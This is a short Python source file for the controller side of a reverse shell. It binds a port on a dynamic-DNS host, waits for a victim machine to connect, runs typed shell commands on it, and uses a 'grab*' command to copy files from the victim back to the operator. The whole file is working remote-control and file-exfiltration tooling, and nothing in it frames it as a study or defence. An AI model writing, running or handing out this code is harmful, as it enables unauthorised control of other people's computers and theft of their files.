import socket
import sys
import os




def transfer(conn,command,file_name):
    conn.send(command)
    f = open(file_name,'wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to find the file' in bits:
            print "[-] Unable to find the file"
            break
        if bits.endswith('DONE'):
            print "[+] Transfer completed"
            f.close()
            break
        f.write(bits)
    f.close()

def connect():
    ip = socket.gethostbyname('rockwilliams.ddns.net')
    print ip
    version = sys.version_info[0]
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,8090))
    s.listen(1)
    conn,addr = s.accept()
    print "[+] We got a connection from: ", addr

    while True:
        if version <= 2:
            command = raw_input("Shell> ")
            send_command = command
        else:
            command = input("Shell> ")
            send_command = command.encode("utf-8")
        if "quit" == command:
            conn.send(send_command)
            conn.close()
            break
        elif command.startswith('grab*'):
            path = command.split('*')[1].strip()
            file_name = os.path.basename(path)
            transfer(conn,send_command,file_name)
        elif command.strip() == "":
            continue
        else:
            conn.send(send_command)
            recv = conn.recv(1024)
            if version <= 2:
                print recv
            else:
                print(recv.decode("utf-8"))

def main():
    connect()
main()
